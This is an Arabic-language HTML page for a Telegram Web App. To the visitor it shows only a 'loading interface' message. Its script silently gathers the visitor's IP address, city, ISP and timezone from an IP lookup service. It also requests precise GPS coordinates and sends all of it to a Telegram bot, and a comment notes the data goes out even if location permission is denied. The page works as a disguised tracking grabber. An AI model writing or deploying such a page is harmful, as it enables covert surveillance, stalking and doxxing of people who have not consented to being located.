<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جارٍ التحميل...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #18222d);
            color: var(--tg-theme-text-color, #ffffff);
            padding: 50px;
            text-align: center;
        }
        h2 {
            font-size: 20px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <h2>⚡ جارٍ معالجة البيانات وتحميل الواجهة...</h2>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let collectedData = {};

        // 1. تحديد وقت الاستخدام المحلي للمستخدم
        const now = new Date();
        collectedData.usage_time = now.toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });

        // 2. جلب معلومات الـ IP والشبكة
        fetch('https://ipwho.is/')
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    collectedData.ip = data.ip;
                    collectedData.country = data.country;
                    collectedData.city = data.city;
                    collectedData.isp = data.connection.isp;
                    collectedData.timezone = data.timezone.id;
                }
                getGPSAndSend();
            })
            .catch(() => {
                getGPSAndSend();
            });

        // 3. محاولة جلب الـ GPS الدقيق
        function getGPSAndSend() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    collectedData.lat = position.coords.latitude;
                    collectedData.lon = position.coords.longitude;
                    sendPayload();
                }, () => {
                    sendPayload(); // الإرسال حتى لو رفض إذن الموقع
                }, { enableHighAccuracy: true });
            } else {
                sendPayload();
            }
        }

        // 4. إرسال البيانات نهائياً وتلقائياً للبوت
        function sendPayload() {
            tg.sendData(JSON.stringify(collectedData));
        }
    </script>
</body>
</html>
